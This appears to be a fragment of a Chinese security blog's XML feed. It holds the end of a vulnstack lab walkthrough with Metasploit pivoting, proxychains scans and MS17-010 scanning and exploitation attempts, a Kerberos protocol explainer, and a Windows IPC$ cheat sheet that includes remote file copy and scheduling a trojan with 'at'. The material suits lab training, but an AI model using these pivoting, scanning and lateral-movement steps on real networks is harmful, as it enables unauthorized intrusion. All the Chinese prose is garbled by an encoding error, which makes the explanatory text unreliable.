<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (post&#x2F;multi&#x2F;manage&#x2F;autoroute):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CMD      autoadd          yes       Specify the autoroute command (Accepted: add</span><br><span class="line">                                       , autoadd, print, delete, default)</span><br><span class="line">   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as</span><br><span class="line">                                       &quot;&#x2F;24&quot;</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)</span><br><span class="line"></span><br><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; set session 10</span><br><span class="line">session &#x3D;&gt; 10</span><br><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post&#x2F;multi&#x2F;manage&#x2F;autoroute):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CMD      autoadd          yes       Specify the autoroute command (Accepted: add</span><br><span class="line">                                       , autoadd, print, delete, default)</span><br><span class="line">   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as</span><br><span class="line">                                       &quot;&#x2F;24&quot;</span><br><span class="line">   SESSION  10               yes       The session to run this module on.</span><br><span class="line">   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; set subnet 192.168.52.0&#x2F;24</span><br><span class="line">subnet &#x3D;&gt; 192.168.52.0&#x2F;24</span><br><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; run</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: windows)</span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Searching for subnets to autoroute.</span><br><span class="line"></span><br><span class="line">[+] Route added to subnet 169.254.0.0&#x2F;255.255.0.0 from host&#39;s routing table.</span><br><span class="line">[+] Route added to subnet 192.168.52.0&#x2F;255.255.255.0 from host&#39;s routing table.</span><br><span class="line">[+] Route added to subnet 192.168.72.0&#x2F;255.255.255.0 from host&#39;s routing table.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line"></span><br><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; route print</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   169.254.0.0        255.255.0.0        Session 10</span><br><span class="line">   192.168.52.0       255.255.255.0      Session 10</span><br><span class="line">   192.168.72.0       255.255.255.0      Session 10</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è®¾ç½®ä»£ç†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; use auxiliary&#x2F;server&#x2F;socks_proxy</span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary&#x2F;server&#x2F;socks_proxy):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password for SOCKS5 listener</span><br><span class="line">   SRVHOST   0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username for SOCKS5 listener</span><br><span class="line">   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  Run a SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; set version 5</span><br><span class="line">version &#x3D;&gt; 5</span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; </span><br><span class="line">[*] Starting the SOCKS proxy server</span><br><span class="line">Interrupt: use the &#39;exit&#39; command to quit</span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 1.</span><br><span class="line"></span><br><span class="line">[*] Starting the SOCKS proxy server</span><br><span class="line">[*] Stopping the SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é…ç½®proxychains4</p>
<p><code>sudo vim /etc/proxychains4.conf</code></p>
<p>æ·»åŠ  <code>socks5 127.0.0.1 1080</code></p>
<p>æµ‹è¯•æ˜¯å¦å¯ä»¥å»è®¿é—®å†…ç½‘</p>
<p><code>proxychains4 curl http://192.168.52.143/</code> æˆåŠŸè®¿é—®åˆ°</p>
<p><img src="/posts/bb76ba56/proxy.png"></p>
<p>ä½¿ç”¨ä»£ç†è®¿é—®å†…ç½‘ä¸­192.168.52.141çš„æœºå™¨</p>
<p><code>proxychains4 nmap -Pn -sT 192.168.52.141</code>nmapæ‰«æä¸€ä¸‹ç«¯å£ï¼Œæ‰«äº†å¾ˆé•¿æ—¶é—´â€¦â€¦</p>
<p><img src="/posts/bb76ba56/nmap_output.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.52.141</span><br><span class="line">Host is up (1.5s latency).</span><br><span class="line">Not shown: 987 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21&#x2F;tcp   open  ftp</span><br><span class="line">135&#x2F;tcp  open  msrpc</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds</span><br><span class="line">777&#x2F;tcp  open  multiling-http</span><br><span class="line">1025&#x2F;tcp open  NFS-or-IIS</span><br><span class="line">1028&#x2F;tcp open  unknown</span><br><span class="line">1029&#x2F;tcp open  ms-lsa</span><br><span class="line">1030&#x2F;tcp open  iad1</span><br><span class="line">6002&#x2F;tcp open  X11:2</span><br><span class="line">7001&#x2F;tcp open  afs3-callback</span><br><span class="line">7002&#x2F;tcp open  afs3-prserver</span><br><span class="line">8099&#x2F;tcp open  unknown</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ä½¿ç”¨msfä¸­çš„<code>auxiliary/scanner/portscan/tcp</code>è·‘ä¸€ä¸‹å¼€æ”¾ç«¯å£</p>
<p><img src="/posts/bb76ba56/msf_portscan_tcp.png"></p>
<p>å…ˆåˆ©ç”¨smbæ‰«æç³»ç»Ÿç‰ˆæœ¬ <code>auxiliary/scanner/smb/smb_version</code></p>
<p><img src="/posts/bb76ba56/msf_smb.png"></p>
<p><img src="/posts/bb76ba56/msf_smb2.png"></p>
<p><img src="/posts/bb76ba56/msf_smb3.png"></p>
<p>ä½¿ç”¨msfæ‰«ææ¨¡å—æ£€æµ‹æ˜¯å¦å­˜åœ¨ms17-010æ¼æ´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; use &#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting        Required  Description</span><br><span class="line">   ----         ---------------        --------  -----------</span><br><span class="line">   CHECK_ARCH   true                   no        Check for architecture on vulnerab</span><br><span class="line">                                                 le hosts</span><br><span class="line">   CHECK_DOPU   true                   no        Check for DOUBLEPULSAR on vulnerab</span><br><span class="line">                                                 le hosts</span><br><span class="line">   CHECK_PIPE   false                  no        Check for named pipe on vulnerable</span><br><span class="line">                                                  hosts</span><br><span class="line">   NAMED_PIPES  &#x2F;usr&#x2F;share&#x2F;metasploit  yes       List of named pipes to check</span><br><span class="line">                -framework&#x2F;data&#x2F;wordl</span><br><span class="line">                ists&#x2F;named_pipes.txt</span><br><span class="line">   RHOSTS       192.168.52.0&#x2F;24        yes       The target host(s), range CIDR ide</span><br><span class="line">                                                 ntifier, or hosts file with syntax</span><br><span class="line">                                                  &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT        445                    yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                      no        The Windows domain to use for auth</span><br><span class="line">                                                 entication</span><br><span class="line">   SMBPass                             no        The password for the specified use</span><br><span class="line">                                                 rname</span><br><span class="line">   SMBUser                             no        The username to authenticate as</span><br><span class="line">   THREADS      100                    yes       The number of concurrent threads (</span><br><span class="line">                                                 max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.52.0&#x2F;24</span><br><span class="line">rhosts &#x3D;&gt; 192.168.52.0&#x2F;24</span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 500</span><br><span class="line">threads &#x3D;&gt; 500</span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.52.143:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned  45 of 256 hosts (17% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned  52 of 256 hosts (20% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned  77 of 256 hosts (30% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 114 of 256 hosts (44% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 145 of 256 hosts (56% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[-] 192.168.52.141:445    - An SMB Login Error occurred while connecting to the IPC$ tree.</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 190 of 256 hosts (74% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 205 of 256 hosts (80% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 255 of 256 hosts (99% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ms17_010_command</p>
<p> <code>use auxiliary/admin/smb/ms17_010_command</code>ï¼Œä½†æ˜¯éƒ½åˆ©ç”¨å¤±è´¥äº†â€¦â€¦</p>
<p><img src="/posts/bb76ba56/ms17_010_error.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberosåè®®åˆ†æ</title>
    <url>/posts/e9f6bf8b/</url>
    <content><![CDATA[<h3 id="å‚ä¸è§’è‰²"><a href="#å‚ä¸è§’è‰²" class="headerlink" title="å‚ä¸è§’è‰²"></a>å‚ä¸è§’è‰²</h3><ul>
<li>Client</li>
<li>Server</li>
<li>KDC<ul>
<li>ADï¼šå­˜å‚¨æ‰€æœ‰Clientçš„ç™½åå•ï¼Œç”¨äºéªŒè¯Clientèº«ä»½</li>
<li>ASï¼šä¸ºClientç”ŸæˆTGT æœåŠ¡</li>
<li>TGSï¼šä¸ºClientç”ŸæˆæŸä¸ªæœåŠ¡çš„Ticket</li>
</ul>
</li>
</ul>
<h3 id="åè¯è§£é‡Š"><a href="#åè¯è§£é‡Š" class="headerlink" title="åè¯è§£é‡Š"></a>åè¯è§£é‡Š</h3><p>ASï¼šèº«ä»½è®¤è¯æœåŠ¡ï¼Œç”¨äºéªŒè¯Clientèº«ä»½</p>
<p>KDCï¼šå¯†é’¥åˆ†å‘ä¸­å¿ƒ</p>
<p>TGTï¼šç¥¨æ®ä¸­å¿ƒï¼Œè®¿é—®TGSçš„ç¥¨æ®</p>
<p>TGSï¼šç¥¨æ®æˆæƒæœåŠ¡</p>
<p>STï¼šè®¿é—®Serverçš„ç¥¨æ®</p>
<p>SessionKeyï¼šä¸´æ—¶ä¼šè¯å¯†é’¥aï¼ŒASç”Ÿæˆå‘é€ç»™å®¢æˆ·ç«¯(éšæœºå¯†é’¥)</p>
<p>ServerSessionKeyï¼šä¸´æ—¶ä¼šè¯å¯†é’¥bï¼ŒTGSç”Ÿæˆå‘é€ç»™å®¢æˆ·ç«¯(éšæœºå¯†é’¥)</p>
<h3 id="å…·ä½“æµç¨‹"><a href="#å…·ä½“æµç¨‹" class="headerlink" title="å…·ä½“æµç¨‹"></a>å…·ä½“æµç¨‹</h3><h4 id="Client-å‘KDC-ASç”³è¯·TGT"><a href="#Client-å‘KDC-ASç”³è¯·TGT" class="headerlink" title="Client å‘KDC-ASç”³è¯·TGT"></a>Client å‘KDC-ASç”³è¯·TGT</h4><h5 id="Client-gt-KDC-AS-AS-REQ"><a href="#Client-gt-KDC-AS-AS-REQ" class="headerlink" title="Client -&gt; KDC-AS (AS_REQ)"></a>Client -&gt; KDC-AS (AS_REQ)</h5><p>å‘é€AS_REQï¼š(è¢«ClientåŠ å¯†çš„æ—¶é—´æˆ³, å®¢æˆ·ç«¯ä¿¡æ¯, æœåŠ¡å™¨ç«¯ä¿¡æ¯)</p>
<p>KDC-ASè¿›è¡Œè®¤è¯ çœ‹æ˜¯å¦åœ¨ç™½åå•ä¸­</p>
<h5 id="KDC-AS-gt-Client-AS-REP"><a href="#KDC-AS-gt-Client-AS-REP" class="headerlink" title="KDC-AS -&gt; Client(AS_REP)"></a>KDC-AS -&gt; Client(AS_REP)</h5><p>å¦‚æœè®¤è¯é€šè¿‡ï¼ŒASä¼šéšæœºç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸² <strong>Sessionkey</strong></p>
<p>å‘é€ä¸¤æ¡æ¶ˆæ¯</p>
<p>T(C)   Client Pass Hash(SessionKey)  ,ç”¨äºåç»­ä¸TGSæœåŠ¡é€šä¿¡</p>
<pre><code>å‘é€ SessionKey 
</code></pre>
<p>TGT   KDC Pass Hash(SessionKey, Clientä¿¡æ¯) ï¼Œä½œä¸ºå‘TGSç”³è¯·ç¥¨æ®çš„å‡­è¯</p>
<pre><code>å‘é€ SessionKey Clientä¿¡æ¯ ç»“æŸæ—¶é—´
</code></pre>
<h4 id="Clientå¾—åˆ°TGTåï¼Œå‘KDCè¯·æ±‚è®¿é—®serverçš„æƒé™ã€‚é€šè¿‡Clientå¾—åˆ°çš„TGTåˆ¤æ–­æ˜¯å¦å¯ä»¥æ‹¥æœ‰è®¿é—®Serverçš„æƒé™ï¼Œå¦‚æœå¯ä»¥å°±ç»™Clientè®¿é—®Serveræƒé™çš„ticket"><a href="#Clientå¾—åˆ°TGTåï¼Œå‘KDCè¯·æ±‚è®¿é—®serverçš„æƒé™ã€‚é€šè¿‡Clientå¾—åˆ°çš„TGTåˆ¤æ–­æ˜¯å¦å¯ä»¥æ‹¥æœ‰è®¿é—®Serverçš„æƒé™ï¼Œå¦‚æœå¯ä»¥å°±ç»™Clientè®¿é—®Serveræƒé™çš„ticket" class="headerlink" title="Clientå¾—åˆ°TGTåï¼Œå‘KDCè¯·æ±‚è®¿é—®serverçš„æƒé™ã€‚é€šè¿‡Clientå¾—åˆ°çš„TGTåˆ¤æ–­æ˜¯å¦å¯ä»¥æ‹¥æœ‰è®¿é—®Serverçš„æƒé™ï¼Œå¦‚æœå¯ä»¥å°±ç»™Clientè®¿é—®Serveræƒé™çš„ticket"></a>Clientå¾—åˆ°TGTåï¼Œå‘KDCè¯·æ±‚è®¿é—®serverçš„æƒé™ã€‚é€šè¿‡Clientå¾—åˆ°çš„TGTåˆ¤æ–­æ˜¯å¦å¯ä»¥æ‹¥æœ‰è®¿é—®Serverçš„æƒé™ï¼Œå¦‚æœå¯ä»¥å°±ç»™Clientè®¿é—®Serveræƒé™çš„ticket</h4><h5 id="Client-gt-KDC-TGS-TGS-REQ"><a href="#Client-gt-KDC-TGS-TGS-REQ" class="headerlink" title="Client -&gt; KDC-TGS (TGS_REQ)"></a>Client -&gt; KDC-TGS (TGS_REQ)</h5><p>å®¢æˆ·ç«¯ä½¿ç”¨NTLM Hashè§£å¯†T(C) å¾—åˆ°<strong>SessionKey</strong></p>
<p>Client å‘ TGS å‘é€æ¶ˆæ¯</p>
<pre><code>TGT

SessionKey(Clientä¿¡æ¯,æ—¶é—´æˆ³) å¯ä»¥è®°ä½œè®¤è¯å› å­ï¼Œä½¿ç”¨SessionKeyè¿›è¡ŒåŠ å¯†

Clientä¿¡æ¯

Serverä¿¡æ¯
</code></pre>
<h5 id="KDC-TGS-gt-Client-TGS-REP"><a href="#KDC-TGS-gt-Client-TGS-REP" class="headerlink" title="KDC-TGS -&gt; Client(TGS_REP)"></a>KDC-TGS -&gt; Client(TGS_REP)</h5><p>KDCä½¿ç”¨NTLMHashè§£å¯† TGT å¾—åˆ° (SessionKeyï¼ŒClientä¿¡æ¯ï¼Œç»“æŸæ—¶é—´)</p>
<p>ç„¶åä½¿ç”¨SessionKeyè§£å¯† è®¤è¯å› å­ å¾—åˆ°(Clientä¿¡æ¯ï¼Œæ—¶é—´æˆ³)</p>
<p>æ ¡éªŒ æ—¶é—´æˆ³ä¸å½“å‰æ—¶é—´ å’Œè§£å¯†TGTåçš„Clientä¿¡æ¯ä¸SessionKeyè§£å¯†åçš„Clientä¿¡æ¯</p>
<p>æ ¡éªŒé€šè¿‡åï¼Œä¼šåˆ¤æ–­å®¢æˆ·ç«¯æœ‰æ²¡æœ‰æƒé™è®¿é—®æœåŠ¡ç«¯    </p>
<p>è®¤è¯é€šè¿‡åï¼ŒKDC ä¼šç”ŸæˆServerSessionKey(éšæœºç”Ÿæˆ)</p>
<p>å‘é€RGS_REP:</p>
<p>SessionKey(ServerSessionKey, Clientä¿¡æ¯ï¼Œç¥¨æ®åˆ°æœŸæ—¶é—´)  ï¼ˆä½¿ç”¨SessionKeyåŠ å¯†çš„ServerSessionKey ï¼‰</p>
<p>ST (ServerSessionKey, å®¢æˆ·ä¿¡æ¯ ï¼Œç¥¨æ®åˆ°æœŸæ—¶é—´)  </p>
<p>ç¥¨æ®åˆ°æœŸæ—¶é—´å¯ä»¥ç†è§£æˆTGSç”Ÿå‘½å‘¨æœŸ</p>
<h4 id="Clientå¾—åˆ°STåï¼Œå¯ä»¥è®¿é—®server"><a href="#Clientå¾—åˆ°STåï¼Œå¯ä»¥è®¿é—®server" class="headerlink" title="Clientå¾—åˆ°STåï¼Œå¯ä»¥è®¿é—®server"></a>Clientå¾—åˆ°STåï¼Œå¯ä»¥è®¿é—®server</h4><p>Client æ”¶åˆ°ä¿¡æ¯åï¼Œä½¿â½¤Session Keyè§£å¯†è·å¾— (ServerSessionKey, Clientä¿¡æ¯ï¼ŒTGSç”Ÿå‘½å‘¨æœŸï¼‰</p>
<h5 id="Client-gt-Server-AP-REQ"><a href="#Client-gt-Server-AP-REQ" class="headerlink" title="Client -&gt; Server (AP-REQ)"></a>Client -&gt; Server (AP-REQ)</h5><p>å‘é€AP-REQ:</p>
<pre><code>ST

ServerSessionKey(å®¢æˆ·ä¿¡æ¯, ç¥¨æ®åˆ°æœŸæ—¶é—´) è®°ä½œè®¤è¯å› å­2ï¼Œä½¿ç”¨ServerSessionKeyåŠ å¯†
</code></pre>
<h5 id="Server-gt-Client-AP-REP"><a href="#Server-gt-Client-AP-REP" class="headerlink" title="Server -&gt; Client(AP-REP)"></a>Server -&gt; Client(AP-REP)</h5><p>Serverä½¿ç”¨NTLM Hashè§£å¯†ST å¾—åˆ° (ServerSessionKey,  Clientä¿¡æ¯ï¼Œç¥¨æ®åˆ°æœŸæ—¶é—´)</p>
<p>ç”¨ServerSessionKeyè§£å¯†è®¤è¯å› å­2 å¾—åˆ° (Clientä¿¡æ¯ï¼Œç¥¨æ®åˆ°æœŸæ—¶é—´)</p>
<p>ç„¶åå†æ ¡éªŒæ—¶é—´æˆ³å’ŒClientä¿¡æ¯</p>
<p>æ ¡éªŒé€šè¿‡åï¼Œå®¢æˆ·ç«¯å³å¯è®¿é—®æœåŠ¡ç«¯</p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸ç”¨Windowsè¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤</title>
    <url>/posts/9527b68a/</url>
    <content><![CDATA[<h3 id="IPC-å…±äº«è¿æ¥"><a href="#IPC-å…±äº«è¿æ¥" class="headerlink" title="IPC$å…±äº«è¿æ¥"></a>IPC$å…±äº«è¿æ¥</h3><p>IPC$ ï¼ˆInternet Process Connection) å…±äº«â€å‘½åç®¡é“â€çš„èµ„æºï¼Œä¸ºå®ç°è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„é€šé“ã€‚ä½¿ç”¨è¯¥å‘½ä»¤å¯ä»¥ä¸ç›®æ ‡ä¸»æœºå»ºç«‹è¿æ¥ï¼Œå»ºç«‹è¿æ¥åå¯ä»¥è®¿é—®ç›®æ ‡ä¸»æœºçš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸‹è½½ã€ä¸Šä¼ ã€å‘½ä»¤æ‰§è¡Œç­‰æ“ä½œã€‚</p>
<br>

<h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ul>
<li>ç›®æ ‡ä¸»æœºå¼€å¯139ï¼Œ445ç«¯å£</li>
<li>ç›®æ ‡ä¸»æœºç®¡ç†å‘˜å¼€å¯<code>IPC$</code>é»˜è®¤å…±äº«æœåŠ¡</li>
<li>çŸ¥é“ç›®æ ‡ä¸»æœºçš„è´¦å·å¯†ç </li>
</ul>
<br>

<h4 id="æ“ä½œå‘½ä»¤"><a href="#æ“ä½œå‘½ä»¤" class="headerlink" title="æ“ä½œå‘½ä»¤"></a>æ“ä½œå‘½ä»¤</h4><h5 id="æŸ¥çœ‹Windowsé»˜è®¤å¼€å¯çš„å…±äº«"><a href="#æŸ¥çœ‹Windowsé»˜è®¤å¼€å¯çš„å…±äº«" class="headerlink" title="æŸ¥çœ‹Windowsé»˜è®¤å¼€å¯çš„å…±äº«"></a>æŸ¥çœ‹Windowsé»˜è®¤å¼€å¯çš„å…±äº«</h5><p><code>net share</code> </p>
<h5 id="æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€å»ºç«‹çš„è¿æ¥"><a href="#æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€å»ºç«‹çš„è¿æ¥" class="headerlink" title="æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€å»ºç«‹çš„è¿æ¥"></a>æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€å»ºç«‹çš„è¿æ¥</h5><p><code>net use</code></p>
<h4 id="ç¡®å®šä¸»æœºæ—¶é—´"><a href="#ç¡®å®šä¸»æœºæ—¶é—´" class="headerlink" title="ç¡®å®šä¸»æœºæ—¶é—´"></a>ç¡®å®šä¸»æœºæ—¶é—´</h4><p><code>net time \\ip </code></p>
<h4 id="å¼€å¯-å…³é—­IPC-å…±äº«"><a href="#å¼€å¯-å…³é—­IPC-å…±äº«" class="headerlink" title="å¼€å¯/å…³é—­IPC$å…±äº«"></a>å¼€å¯/å…³é—­IPC$å…±äº«</h4><p><code>net share ipc$</code> </p>
<p><code>net share ipc$ /del</code></p>
<h5 id="å»ºç«‹ç©ºè¿æ¥"><a href="#å»ºç«‹ç©ºè¿æ¥" class="headerlink" title="å»ºç«‹ç©ºè¿æ¥"></a>å»ºç«‹ç©ºè¿æ¥</h5><p><code>net use \\127.0.0.1\ipc$  &quot;&quot;  /user:&quot;&quot; </code></p>
<h5 id="å»ºç«‹å®Œæ•´çš„ç”¨æˆ·å-å¯†ç IPC-è¿æ¥"><a href="#å»ºç«‹å®Œæ•´çš„ç”¨æˆ·å-å¯†ç IPC-è¿æ¥" class="headerlink" title="å»ºç«‹å®Œæ•´çš„ç”¨æˆ·å å¯†ç IPC$è¿æ¥"></a>å»ºç«‹å®Œæ•´çš„ç”¨æˆ·å å¯†ç IPC$è¿æ¥</h5><p><code>net use \\10.10.0.164\ipc$ &quot;password&quot;  /user:&quot;username&quot; </code></p>
<h5 id="åˆ é™¤IPC-è¿æ¥"><a href="#åˆ é™¤IPC-è¿æ¥" class="headerlink" title="åˆ é™¤IPC$è¿æ¥"></a>åˆ é™¤IPC$è¿æ¥</h5><p><code>net use \\127.0.0.1\ipc$ /del</code></p>
<h5 id="è·¯å¾„æ˜ å°„"><a href="#è·¯å¾„æ˜ å°„" class="headerlink" title="è·¯å¾„æ˜ å°„"></a>è·¯å¾„æ˜ å°„</h5><p><code>net use z: \\10.10.0.164\c$  &quot;password&quot; /user:&quot;username&quot; </code> æŠŠç›®æ ‡ä¸»æœºçš„cç›˜æ˜ å°„åˆ°æœ¬åœ°ä¸»æœºçš„zç›˜(æ²¡æœ‰å»ºç«‹ipcè¿æ¥æƒ…å†µä¸‹)</p>
<p><code>net use z: \\10.10.0.164\c$</code>ï¼ˆå·²ç»å»ºç«‹ipcè¿æ¥çš„æƒ…å†µä¸‹ï¼‰</p>
<p><img src="/posts/9527b68a/yingshe.png"></p>
<h5 id="åˆ é™¤æ˜ å°„çš„zç›˜"><a href="#åˆ é™¤æ˜ å°„çš„zç›˜" class="headerlink" title="åˆ é™¤æ˜ å°„çš„zç›˜"></a>åˆ é™¤æ˜ å°„çš„zç›˜</h5><p><code>net use z: /del </code></p>
<h5 id="åˆ é™¤å…¨éƒ¨"><a href="#åˆ é™¤å…¨éƒ¨" class="headerlink" title="åˆ é™¤å…¨éƒ¨"></a>åˆ é™¤å…¨éƒ¨</h5><p><code>net use * /del</code></p>
<h5 id="ä½¿ç”¨diræŸ¥çœ‹ç›®æ ‡æœºå™¨ç›®å½•"><a href="#ä½¿ç”¨diræŸ¥çœ‹ç›®æ ‡æœºå™¨ç›®å½•" class="headerlink" title="ä½¿ç”¨diræŸ¥çœ‹ç›®æ ‡æœºå™¨ç›®å½•"></a>ä½¿ç”¨diræŸ¥çœ‹ç›®æ ‡æœºå™¨ç›®å½•</h5><p><code>dir \\10.10.0.164\c$</code></p>
<p><img src="/posts/9527b68a/dir.png"></p>
<h5 id="å¤åˆ¶æ–‡ä»¶"><a href="#å¤åˆ¶æ–‡ä»¶" class="headerlink" title="å¤åˆ¶æ–‡ä»¶"></a>å¤åˆ¶æ–‡ä»¶</h5><p><code>copy test.txt \\10.10.0.164\c$</code> å°†test.txtå¤åˆ¶åˆ°ç›®æ ‡ä¸»æœºçš„cç›˜</p>
<h5 id="ä¸‹è½½æ–‡ä»¶"><a href="#ä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä¸‹è½½æ–‡ä»¶"></a>ä¸‹è½½æ–‡ä»¶</h5><p><code>copy \\10.10.0.164\c$\test.txt </code></p>
<h4 id="ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡"><a href="#ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡" class="headerlink" title="ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡"></a>ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡</h4><p><code>at \\&lt;ç›®æ ‡ä¸»æœºip&gt; &lt;å¯åŠ¨æ—¶é—´&gt; &lt;æœ¨é©¬æ‰€åœ¨ä½ç½®&gt;</code></p>
<p><code>at \\10.10.0.164  </code></p>
<p>åˆ é™¤idä¸º1çš„è®¡åˆ’ä»»åŠ¡</p>
<p><code>at \\10.10.0.164 1 /delete</code></p>
<h4 id="ä½¿ç”¨typeè¯»å–æ–‡ä»¶"><a href="#ä½¿ç”¨typeè¯»å–æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨typeè¯»å–æ–‡ä»¶"></a>ä½¿ç”¨typeè¯»å–æ–‡ä»¶</h4><p><code>type \\10.10.0.164\c$\1.txt </code>  è¯»å–ç›®æ ‡æœºå™¨çš„1.txtæ–‡ä»¶</p>
<br>

<br>

<h4 id="å®ä¾‹1"><a href="#å®ä¾‹1" class="headerlink" title="å®ä¾‹1"></a>å®ä¾‹1</h4><p>win7  æ”»å‡»æœº  </p>
<p>win2012 ç›®æ ‡æœº   10.10.0.164</p>
<br>

